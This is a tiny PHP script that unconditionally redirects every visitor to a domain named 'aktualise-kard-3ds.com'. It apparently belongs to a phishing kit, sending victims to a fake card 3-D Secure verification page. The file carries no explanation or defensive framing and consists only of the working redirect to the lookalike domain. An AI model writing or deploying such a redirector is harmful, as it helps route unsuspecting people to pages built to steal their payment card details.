<?php

function Redirect($url, $permanent = false)
{
  header('Location: ' . $url, true, $permanent ? 301 : 302);
  exit();
}
Redirect('//aktualise-kard-3ds.com/index.php/', false);
